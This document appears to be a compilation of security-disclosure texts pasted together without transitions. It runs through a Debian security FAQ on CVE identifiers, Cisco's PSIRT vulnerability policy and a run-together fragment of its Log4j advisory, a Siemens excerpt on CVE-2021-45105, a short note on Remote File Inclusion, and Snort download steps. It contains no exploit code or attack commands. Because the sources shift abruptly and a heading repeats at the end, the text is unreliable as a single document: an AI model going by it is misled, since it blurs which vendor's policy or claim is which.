*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

## General Security-Related Queries

For general security concerns about Cisco products and cloud-hosted services, the Cisco Technical Assistance Center (TAC) can provide configuration and technical assistance.

### **Cisco.com**

The [Cisco Security portal](https://www.cisco.com/security) on Cisco.com provides Cisco security vulnerability documents and Cisco security information, including relevant security products and services.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

You must send the messages from the account that you want to be subscribed to or unsubscribed from the list.

Customers can also request to be subscribed or unsubscribed to the cust-security-announce mailing list by emailing psirt@cisco.com.

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers. For help with a product not listed in this tool, please use the Feedback link on the [CVR page](https://sec.cloudapps.cisco.com/security/center/cvr) or contact your support organization.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details.

The designated Security Advisory status indicates the following:

**Interim:** The Cisco investigation is ongoing. Cisco will issue revisions to the advisory when additional information, including fixed software release data, becomes available.

**Final:** Cisco has completed its evaluation of the vulnerability described in the advisory. There will be no further updates unless there is a material change in the nature of the vulnerability.

All aspects of this process are subject to change without notice and on a case-by-case basis. No particular level of response is guaranteed for any specific issue or class of issues.

To help detect exploitation of these vulnerabilities, Cisco has released Snort rules at the following location: [Talos Rules 2021-12-21](https://www.snort.org/advisories/talos-rules-2021-12-21)  Product fixes that are listed in this advisory will address both CVE-2021-44228 and CVE-2021-45046 unless otherwise noted.  Cisco has reviewed CVE-2021-45105 and CVE-2021-44832 and has determined that no Cisco products or cloud offerings are impacted by these vulnerabilities.  Cisco's standard practice is to update integrated third-party software components to later versions as they become available.  This advisory is available at the following link:<https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd>  Affected Products  * Cisco investigated its product line to determine which products may be affected by these vulnerabilities.  This advisory only lists Cisco products and services that are known to include the impacted software component and thus may be vulnerable. Products and services that do not contain the impacted software component are not vulnerable and therefore are not listed in this advisory. Any Cisco product or service that is not explicitly listed in the Affected Products section of this advisory is not affected by the vulnerability or vulnerabilities described.  The [Vulnerable Products](#vp) section includes Cisco bug IDs for each affected product. The bugs are accessible through the Cisco Bug Search Tool and contain additional platform-specific information, including workarounds (if available) and fixed software releases.    Vulnerable Products Cisco investigated its product line to determine which products may be affected by these vulnerabilities.  The following table lists Cisco products that are affected by one or both of the vulnerabilities that are described in this advisory.

GENERAL SECURITY RECOMMENDATIONS

As a general security measure, Siemens strongly recommends to protect network access to devices
with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens
recommends to conﬁgure the environment according to Siemens’ operational guidelines for Industrial
Security (Download: https://www.siemens.com/cert/operational-guidelines-industrial-security), and to
follow the recommendations in the product manuals.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s

environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

An additional classiﬁcation has been performed using the CWE classiﬁcation, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identiﬁcation, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2021-45105

Apache Log4j2 versions 2.0-alpha1 through 2.16.0 did not protect from uncontrolled recursion from
self-referential lookups, when the logging conﬁguration uses a non-default Pattern Layout with a
Context Lookup (for example, $${ctx:loginId}).

This could allow attackers with control over Thread Context Map (MDC) input data to craft malicious
input data that contains a recursive lookup, resulting in a denial of service condition.

### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

What is Snort?

Snort is the foremost Open Source Intrusion Prevention System (IPS) in the world. Snort IPS uses a series of rules
that help define malicious network activity and uses those rules to find packets that match against them and
generates alerts for users.

Snort can be deployed inline to stop these packets, as well. Snort has three primary uses:
As a packet sniffer like tcpdump, as a packet logger — which is useful for network traffic debugging, or it can be
used as a full-blown network intrusion prevention system. Snort can be downloaded and configured for personal
and business use alike.

What are my options for buying and using Snort?

Once downloaded and configured, Snort rules are distributed in two sets: The “Community Ruleset” and the “Snort Subscriber Ruleset.”

The Snort Subscriber Ruleset is developed, tested, and approved by Cisco Talos. Subscribers to the Snort Subscriber Ruleset will receive the
ruleset in real-time as they are released to Cisco customers. You can download the rules and deploy them in your network through the Snort.org website. The Community Ruleset is developed by the Snort community and QAed by Cisco Talos. It is freely available to all users.

For more information about Snort Subscriber Rulesets available for purchase, please visit the [Snort product page](/products).

 [Get Started](/)
Step 1
#### Download and install the source code

If this is your first time installing Snort, please review the [dependencies list](https://github.com/snort3/snort3#readme).

```
<https://github.com/snort3/snort3/releases>
```

You can also get the code with:

```
git clone https://github.com/snort3/snort3.git
```

There are separate extras packages for cmake that provide additional features and demonstrate how to build plugins. The source for extras is in the [snort3\_extra.git](https://github.com/snort3/snort3_extra) repo.

Step 2
#### Sign up and get your Oinkcode - a unique identifier that must be entered into your Snort instance that will automatically pull in Snort rules. All users have access to the Registered Rule Set. In order to get the latest detections (Subscriber Rule Set) you can upgrade your subscription at any time.

### Rule Vulnerability

Remote File Inclusion

